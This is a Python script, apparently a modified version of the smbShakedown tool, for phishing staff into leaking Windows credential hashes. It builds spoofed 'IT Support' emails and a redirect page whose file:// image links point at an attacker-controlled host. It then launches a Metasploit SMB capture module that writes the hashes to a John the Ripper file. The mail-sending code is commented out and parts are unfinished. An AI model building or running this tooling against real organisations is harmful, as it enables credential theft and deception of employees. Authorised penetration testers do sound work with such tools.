#!/usr/bin/env python
'''Heavily modified Smbshakedown
Original by Nick Sanzotta:
https://github.com/NickSanzotta/smbShakedown'''
try:
    #http server
    #import BaseHTTPServer
    import SimpleHTTPServer
    from SimpleHTTPServer import SimpleHTTPRequestHandler

    import argparse
    import getpass
    import json
    import multiprocessing
    import os
    import readline
    import smtplib
    import socket
    import SocketServer
    import StringIO
    import subprocess
    import sys
    import time
    import urllib
    import urllib2
    import readline
    import requests
    from time import sleep
except Exception as e:
    print(str(e))


class Smbshakedown(object):
    '''Smbshakedown class object'''

    def __init__(self, sender_address, sender_name, smtp_port, recipient_name, \
        smtp_server, smtp_username, verbose, rcpt_header, file, image_server,\
        redirect_url):
        
        #static rc file location and name
        self.rc_file = './smb_shakedown.rc'

        #user supplied argument options
        self.sender_address = ''.join(sender_address)
        self.sender_name = ''.join(sender_name)
        self.smtp_port = int(''.join(smtp_port))
        self.recipient_name = ''.join(recipient_name)
        self.smtp_server = ''.join(smtp_server)
        self.smtp_username = ''.join(smtp_username)
        self.verbose = verbose
        self.rcpt_header = ''.join(rcpt_header)
        self.requests_useragent = {'User-agent': 'curl/7.52.1'}
        self.redirect_url = 'http://{}'.format(''.join(redirect_url))
        self.image_server_port = int(''.join(image_server))
        self.recipients_file = ''.join(file)
        

        #call methods to autodiscover local and external IPs
        self.external_ip = self.get_external_ip().strip('\n')
        self.internal_ip = self.get_internal_address()

        #verbosity boolean
        self.verbose = verbose

    def get_external_ip(self):
        try:
            external_ip = requests.get('http://ifconfig.co', headers = self.requests_useragent).content
            return external_ip
        except requests.exceptions.RequestException as e:
            print(e)
            sys.exit(1)

    def get_internal_address(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            s.connect(("8.8.8.8", 53))
        except Exception as e:
            print(e)
        return s.getsockname()[0]

    def check_args(self):

        if self.sender_address is None:
            print('No sender address provided')
            sys.exit(0)
        if self.sender_name is None:
            print('No from name provided')
            sys.exit(0)
        if self.smtp_port is None:
            print('No mail port provided')
            sys.exit(0)
        if self.smtp_server is None:
            print('No SMTP server provided')
            sys.exit(0)
        if self.smtp_username is None:
            print('No SMTP server username provided')
            sys.exit(0)
        if self.smtp_password is None:
            print('No SMTP server password provided')
            sys.exit(0)
        if self.rcpt_header is None:
            print('No RCPT header provided')
            self.rcpt_header = 'staff@company.com'
        if self.recipients_file is None:
            print('No recipients file provided')
            sys.exit(0)

    def prompts(self):
        self.smtp_password = getpass.getpass(r'Enter SMTP Server password: ')

    def validate(self):
        
        print('\nYour settings:\n\n\
rc file:        {0}\n\
FROM Address:   {1}\n\
FROM Name:      {2}\n\
SMTP port:      {3}\n\
Recipient Name: {4}\n\
SMTP Server:    {5}\n\
SMTP Username:  {6}\n\
RCPT TO:        {8}\n\
External IP:    {10}\n\
Local img svr?  {10}:{11}\n\
Redirect URL?   {12}\n\
Recipients:     {9}\n').format(self.rc_file, self.sender_address, self.sender_name, \
        self.smtp_port, self.recipient_name, self.smtp_server, \
        self.smtp_username, self.verbose, self.rcpt_header, \
        self.recipients_file, self.external_ip, self.image_server_port, \
        self.redirect_url)

        
        validate_settings = self.yes_no('\nLook OK? (y/n): ')
        if validate_settings is False:
            print('\nGood catch, let\'s try this again\n')
            sys.exit(0)


    def yes_no(self, answer):
        yes = set(['yes','y', 'ye', ''])
        no = set(['no','n'])
         
        while True:
            choice = raw_input(answer).lower()
            if choice in yes:
               return True
            elif choice in no:
               return False
            else:
                print ('Please respond with \'yes\' or \'no\'\n')


    def smb_server(self):
        smb_server_option = self.yes_no('Use a local Metasploit SMB capture server? (y/n): ')
        
        if smb_server_option is True:
            rc_config = \
            'use auxiliary/server/capture/smb\n\
set srvhost {}\n\
set JOHNPWFILE /opt/smbShakedown/smb_hashes\n\
exploit -j -z'.format(self.get_internal_address())
        

            print('\n{}\n').format(str(rc_config))
            validate_rc_file = self.yes_no('rc file ready to execute? (y/n): ')

            if validate_rc_file is True:
                with open(self.rc_file, 'w') as rc_file:
                    rc_file.writelines(str(rc_config))
                    rc_file.close()
                try:
                    os.system('msfconsole -q -r {}'.format(self.rc_file))
                    
                    print('Running msfconsole -q -r {}'.format(self.rc_file))
                except Exception as e:
                    print('Error: {}'.format(e))
                    sys.exit(1)
            else:
                print('You\'ll need to provide your own rc file. Here\'s a sample')
                print('use auxiliary/server/capture/smb\n\
set srvhost <YOUR.IP.ADDRESS.HERE>\n\
set JOHNPWFILE /opt/smbShakedown/smb_hashes\n\
exploit -j -z')

    def craft_message_body(self):

        print('TIP: Domain based link_tags help avoid the "JunkFolder".')

        if self.image_server_port is None:
            image_server_addr = raw_input('Please enter a FQDN (no http://) or IP: ')
        else:
            image_server_addr = self.external_ip

        link_tag_name = raw_input('Enter text for link_tag to be displayed[CLICK ME!]: ') or 'Click here'

        link_tag = '<a href="http://'+image_server_addr+'/" target="_blank">'+link_tag_name+'</a>' 

 
        ### EDIT: Email Message Template Below ###

        message = """From: {0} <{1}>
        To: {2} <{3}>
        MIME-Version: 1.0
        Content-type: text/html
        Subject: Thank you for all your help.

        Staff,
        <br>
        ...
        <br>
        {5}
        <br>
        sincerely,
        <br>
        <img src=file://{4}/image/sig.jpg height="100" width="150"></a>
        """
        ##########################################################
        
        email_message = message.format(self.sender_name, self.sender_address, \
            self.recipient_name, self.rcpt_header, image_server_addr, link_tag)
                

    def write_file(self, content, filename):
        with open(filename, 'w') as file:
            file.writelines(content)
            file.close()

    def read_file(self, filename):
        with open(filename, 'r') as file:
            content = file.readlines()
            return content

    def craft_http_content(self):
        html = """<!DOCTYPE HTML>
<html lang="en-US">
    <head>
        <meta charset="UTF-8">
        <meta http-equiv="refresh" content="1;url={1}">
        <script type="text/javascript">
            window.location.href = "{1}"
        </script>
<title>SMB Egress Test Page.</title>
</head>
<br>
<img src=file://{0}/image/foo.gif>
</body>
</html>
            """.format(self.external_ip, self.redirect_url)
        print('\nHTML Hosted:\n{}'.format(html))

        self.write_file(html, './index.html')

    def sigterm_handler(self, signal, frame):
        server_kill()

    def sigint_handler(self, signal, frame):
        print('\nCaught Ctrl+C')
        print('Press Enter to close')
        server_kill()

    def run_http_server(self):
        '''Starts Python's SimpleHTTPServer on specified port'''
        if self.image_server_port is not None:

            addr = ("0.0.0.0", self.image_server_port)
            
            Handler = SimpleHTTPServer.SimpleHTTPRequestHandler
            
            
            httpd = SocketServer.TCPServer((addr), Handler, bind_and_activate=False)
            
            httpd.allow_reuse_address = True
            server_process = multiprocessing.Process(target=httpd.serve_forever)
            server_process.daemon = False
            
            try:
                httpd.server_bind()
                httpd.server_activate()
            except Exception as e:
                httpd.server_close()
                print(e)
            # Create process

            try:
                server_process.start()
            except Exception as e:
                print(e)

            
            self.server_pid = server_process.pid
            print('Server running at PID: {}').format(self.server_pid)

            return self.server_pid

    def server_kill(self):
        try:
            # print('Trying to stop server process %s' % str(serverPid))
            os.kill(int(self.server_pid),9)
        except Exception as e:
            print(e)


    def smtp_connection(self):

        recipients = ','.join(self.read_file(self.recipients_file)).strip('\n')
        print (recipients)

        '''
        smtpserver = smtplib.SMTP(self.smtp_server, self.smtp_port)
        smtpserver.ehlo()
        smtpserver.starttls()
        smtpserver.ehlo
        smtpserver.login(self.smtp_username, self.smtp_password)
        print('Testing Connection to your SMTP Server...')
        time.sleep(1)
        try:
            status = smtpserver.noop()[0]
            print("SMTP Server Status: ",status)
            send_prompt = yes_no(self, "Connection successful, send mail now? (y/n): ")


            if send_prompt is True:
                smtpserver.sendmail(self.sender_address, self.recipient_addresses, self.email_message)
                print("Message(s) sent!")
                smtpserver.quit()
                return True
            else:
                smtpserver.quit()
                print("Ok no mail sent.")
                return False

        except:
            status = -1
            print("[Aborting]SMTP Server Status: ",status)
        return True if status == 250 else False
        '''





def main():

    parser = argparse.ArgumentParser()

    parser.add_argument('-a', '--sender_address', \
        metavar='<ITsupport@foo.com>', \
        nargs=1, \
        help='The required sender from address')

    parser.add_argument('-c', '--rcpt_header', \
        metavar='<ITsupport@foo.com>', \
        nargs=1, \
        help='The sender RCPT header address')

    parser.add_argument('-d', '--redirect_url', \
        metavar='<foo.com>',\
        nargs=1,\
        help='Craft a redirect on your local server with supplied value')

    parser.add_argument('-f', '--file', \
        metavar='<target_emails.txt>', \
        nargs=1, \
        help='File with list of targeted emails')

    parser.add_argument('-i', '--image_server', \
        metavar='<8080>',\
        nargs=1,\
        help='Run local HTTP server to host image using specified port, e.g. -i 8080')

    parser.add_argument('-l', '--image_server_addr', \
        metavar='<foo.com>',\
        nargs=1,\
        help='custom URL for image link if not hosted locally')

    parser.add_argument('-n', '--sender_name', \
        metavar='<IT Support>', \
        nargs=1, \
        help='The sender name')

    parser.add_argument('-p', '--smtp_port', \
        metavar='<25>', \
        nargs=1, \
        help='The SMTP port to use')

    parser.add_argument('-r', '--recipient_name', \
        metavar='<Company_All>', \
        nargs=1, \
        help='The Recipient name, best if a spoofed mail list')

    parser.add_argument('-s', '--smtp_server', \
        metavar='<mail.foo.com>', \
        nargs=1, \
        help='The SMTP server to use')

    parser.add_argument('-u', '--smtp_username', \
        metavar='<username>', \
        nargs=1, \
        help='The username for your SMTP server')

    parser.add_argument('-v', '--verbose', \
        help='Verbosity option. Mainly just dumps all output to the screen.', \
        action='store_true')

    args = parser.parse_args()
    args_dict = vars(args)

    c1 = Smbshakedown(args.sender_address, \
        args.sender_name, \
        args.smtp_port, \
        args.recipient_name, \
        args.smtp_server, \
        args.smtp_username, \
        args.verbose, \
        args.rcpt_header, \
        args.file, \
        args.image_server, \
        args.redirect_url)

    c1.get_external_ip()
    c1.prompts()
    c1.check_args()
    c1.validate()
    c1.smb_server()
    c1.craft_http_content()
    c1.smtp_connection()




    #this goes last since it runs forever -- need to fix
    c1.run_http_server()

if __name__ == "__main__":
    main()

'''goes in main


        ### EDIT: HTML Template Below ###
        ### Becareful not to remove the variables {0} and {1} ###
            html = """
            <!DOCTYPE HTML>
            <html lang="en-US">
                <head>
                    <meta charset="UTF-8">
                    <meta http-equiv="refresh" content="1;url={1}">
                    <script type="text/javascript">
                        window.location.href = "{1}"
                    </script>
            <title>SMB Egress Test Page.</title>
            </head>
            <br>
            <img src=file://{0}/image/foo.gif>
            </body>
            </html>
            """
            indexHTML = html.format(smbCaptureServer, redirect)
            print(indexHTML)
            print("\n")
            with open('index.html','w+') as f1:
                f1.write(indexHTML)
            print('Starting HTTP Server')
            print('\n...')
            httpPort = 80
            Handler = SimpleHTTPServer.SimpleHTTPRequestHandler
            httpd = SocketServer.TCPServer(("",httpPort), Handler)
            server_process = multiprocessing.Process(target=httpd.serve_forever)
            server_process.daemon = True
            server_process.start()
            print("Python SimpleHTTPServer now Listening on Port: " + str(httpPort))
            print("\n")
        elif choice in no:
            print('Ok local HTTP Server not started: \n')
        else:
            sys.stdout.write("Please respond with 'yes' or 'no'")
            
    
    elif choice in no:
        print('Okay, A Hyplink will not be added to your message: \n')
        link_tag = ''


    

    print('Email Message Template Below:')
    time.sleep(1)
    print(email_message)
    smtp_connection
(smtp_server_address, smtp_server_port, smtp_user, smtp_password, sender_address, recipient_address, email_message)
    time.sleep(1)
    smbServ()
    '''



